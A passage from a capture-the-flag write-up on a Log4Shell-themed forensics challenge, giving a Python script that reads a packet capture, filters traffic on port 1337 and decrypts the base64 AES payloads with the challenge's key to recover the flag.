We can see that some sort of communication on this port. Since we already know how to decrypt this information, we can just create a script to decrypt every packet that is using the port `1337`.

{% code title="solve.py" %}
```python
from base64 import b64decode
import pyshark
from binascii import unhexlify
from Crypto.Cipher import AES

f = pyshark.FileCapture("./log4shell.pcap", display_filter="tcp.port == 1337", decode_as={'tcp.port==1389':'ldap'})
comms = []

for packet in f:
    if "TCP" in packet and packet.TCP.get_field("payload"):
        payload = unhexlify("".join(packet.TCP.get_field("payload").split(":"))).decode("utf-8").strip()
        if payload and payload != "CHECK" and payload not in comms:
            comms.append(payload)

for comm in comms:
    decoded = b64decode(comm.encode("utf-8"))
    cipher = AES.new(b"094fb198072b6df3", AES.MODE_ECB)
    decrypted = cipher.decrypt(decoded).decode("utf-8")
    if "CJ{" in decrypted:
        print(decrypted)
```
{% endcode %}

After running the script, we can see the flag printed out.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 154730.png" alt=""><figcaption><p>Results from the script</p></figcaption></figure>
